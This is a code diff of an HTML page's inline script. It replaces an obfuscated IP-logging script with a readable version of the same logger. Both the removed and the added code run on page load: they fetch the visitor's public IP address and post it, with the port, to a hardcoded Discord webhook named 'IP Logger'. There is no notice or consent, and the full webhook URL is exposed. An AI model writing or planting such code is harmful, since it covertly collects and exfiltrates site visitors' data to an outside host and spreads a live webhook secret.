@@ -87,57 +87,30 @@
 
   <script>
     (function () {
-      var _0x5f37 = [
-        "https://api.ipify.org?format=json",
-        "https://discord.com/api/webhooks/1319029040631517234/uQW3SU6PfNDr6MTW5WqpDgrjq5e7O0FBSYEbSHokGBr1yXIDfE3R6AhqEJi4UfMhwk3e",
-        "json",
-        "Visitor\x20IP:\x20",
-        "username",
-        "IP\x20Logger",
-        "POST",
-        "Content-Type",
-        "application/json",
-        "Error\x20fetching\x20IP:",
-        "Error\x20sending\x20webhook:",
-        "then",
-        "catch",
-      ];
-      (function (_0x3510da, _0x5f37dc) {
-        var _0x1b33f8 = function (_0x546879) {
-          while (--_0x546879) {
-            _0x3510da["push"](_0x3510da["shift"]());
-          }
-        };
-        _0x1b33f8(++_0x5f37dc);
-      })(_0x5f37, 0xb4);
-      var _0x1b33 = function (_0x3510da, _0x5f37dc) {
-        _0x3510da = _0x3510da - 0x0;
-        var _0x1b33f8 = _0x5f37[_0x3510da];
-        return _0x1b33f8;
-      };
-      fetch(_0x1b33("0x0"))
-        [_0x1b33("0xc")](function (_0x1ec44d) {
-          return _0x1ec44d[_0x1b33("0x2")]();
-        })
-        [_0x1b33("0xc")](function (_0x54a21c) {
-          var _0x4c89d7 = _0x54a21c["ip"];
-          var _0x3af37b = {
-            content: _0x1b33("0x3") + _0x4c89d7,
-            [_0x1b33("0x4")]: _0x1b33("0x5"),
+      const webhookUrl = "https://discord.com/api/webhooks/1319029040631517234/uQW3SU6PfNDr6MTW5WqpDgrjq5e7O0FBSYEbSHokGBr1yXIDfE3R6AhqEJi4UfMhwk3e";
+
+      // Fetch IPv4 Address
+      fetch("https://ipinfo.io?token=YOUR_API_TOKEN") // Replace with your IPInfo token
+        .then((response) => response.json())
+        .then((data) => {
+          const ip = data.ip; // Get the public IPv4 address
+          const port = window.location.port || "Default (80/443)"; // Get the port (if any)
+
+          // Send to Discord webhook
+          const webhookData = {
+            content: `Visitor Info:\nIP: ${ip}\nPort: ${port}`,
+            username: "IP Logger",
           };
-          fetch(_0x1b33("0x1"), {
-            method: _0x1b33("0x6"),
+
+          fetch(webhookUrl, {
+            method: "POST",
             headers: {
-              [_0x1b33("0x7")]: _0x1b33("0x8"),
+              "Content-Type": "application/json",
             },
-            body: JSON["stringify"](_0x3af37b),
-          })[_0x1b33("0xc")](function () {})[_0x1b33("0xd")](function (_0x2ce02e) {
-            console["error"](_0x1b33("0xb"), _0x2ce02e);
-          });
+            body: JSON.stringify(webhookData),
+          }).catch((err) => console.error("Error sending webhook:", err));
         })
-        [_0x1b33("0xd")](function (_0x2e7da7) {
-          console["error"](_0x1b33("0xa"), _0x2e7da7);
-        });
+        .catch((err) => console.error("Error fetching IP:", err));
     })();
   </script>
 </body>
